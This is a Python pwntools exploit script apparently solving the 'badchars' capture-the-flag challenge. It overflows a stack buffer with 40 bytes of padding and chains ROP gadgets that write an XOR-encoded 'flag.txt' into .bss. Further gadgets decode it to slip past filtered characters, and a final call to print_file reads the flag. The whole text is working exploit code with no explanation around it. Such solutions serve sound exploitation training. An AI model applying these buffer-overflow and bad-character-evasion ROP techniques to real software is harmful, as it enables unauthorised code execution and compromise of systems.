from pwn import *

p = process('./badchars')

e = ELF('./badchars')

rop = ROP(e)
BSS = e.bss()
XOR = 0x0000000000400628 # xor byte ptr [r15], r14b ; ret
POP_RDI = 0x00000000004006a3 # pop rdi ; ret
MOV = 0x0000000000400634 # mov qword ptr [r13], r12 ; ret
print_file = e.sym['print_file']
POP_ALL = 0x000000000040069c # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret

key = 0x23
encoded = bytes([b ^ key for b in b'flag.txt'])

p.recvuntil(b': ')
output = p.recvuntil(b'> ')
badchars = [chr(b[1]) for b in output.strip().split(b', ')]

for c in encoded:
    if chr(c) in badchars:
        sys.exit(1)

padding = b'A' * 40

payload = padding + p64(POP_ALL) + p64(u64(encoded)) + p64(BSS) + p64(key) + p64(BSS) + p64(MOV)
print(p64(key))
for i in range(8):
    payload += p64(POP_ALL)
    payload += p64(0)
    payload += p64(0)
    payload += p64(key)
    payload += p64(BSS + i)
    payload += p64(XOR)

payload += p64(POP_RDI) + p64(BSS) + p64(print_file)

p.sendline(payload)

p.interactive()



